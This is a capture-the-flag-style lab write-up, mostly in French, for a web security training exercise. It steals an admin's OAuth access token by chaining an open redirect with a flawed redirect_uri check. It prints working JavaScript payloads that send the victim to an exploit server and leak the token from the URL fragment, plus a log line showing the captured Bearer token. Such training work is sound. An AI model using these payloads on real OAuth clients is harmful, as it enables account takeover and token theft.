# Stealing OAuth access tokens via an open redirect

```
This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
Note

You cannot access the admin's API key by simply logging in to their account on the client application.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in via your own social media account using the following credentials: wiener:peter. 
```

On cherche a rediriger l'utilisateur admin vers notre serveur d'exploitation :
- Depuis `redirect_uri` impossible car filtrage

On cherche sur le site un endroit où la vulnérabilité open redirect peut être exploité :
- On trouve le endpoint suivant : `/post/next?path=ANY_PATH`

On redirige donc l'utilisateur vers la page du site autorisant la redirection vers le serveur d'exploitation.

> Création payload à envoyer depuis le serveur d'exploit :

Ici lorsque l'utilisateur va être rediriger vers notre serveur d'exploitation, il sera rediriger une nouvelle fois vers cette page après la récuperation du token grâce à `hash.substr(1)` :
```html
<img src="test" onerror="document.location = '/?'+document.location.hash.substr(1)"/>
```

On crée le script final à envoyer à l'administrateur

```html
<script>
 if(!document.location.hash){document.location='https://oauth-0a6000db041fd606811e79ad02e0002c.oauth-server.net/auth?client_id=phk24a9cat6qv2fnc4dqv&redirect_uri=https://0a96008a04dcd687815a7b9800a6000c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a430080048ed6c581af7a7101e200ad.exploit-server.net/exploit&response_type=token&nonce=742793739&scope=openid%20profile%20email'}else{document.location = '/?'+document.location.hash.substr(1)}
</script>
```

On envoi à l'administrateur et on récupère son token dans les logs du serveur d'exploitation :

```
10.0.4.214      2023-04-21 14:34:35 +0000 "GET /?access_token=QZ3PWbNaVMu9Vi9emo6JM3qgO1qcD6VHqPsWN2Q6n4u&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36"
```

On accède à la page `/me` afin de récuperer la clé d'API de l'administrateur. On utilise le token de l'administrateur récupéré précedemment.

> SOLVED : Good Job ! ^^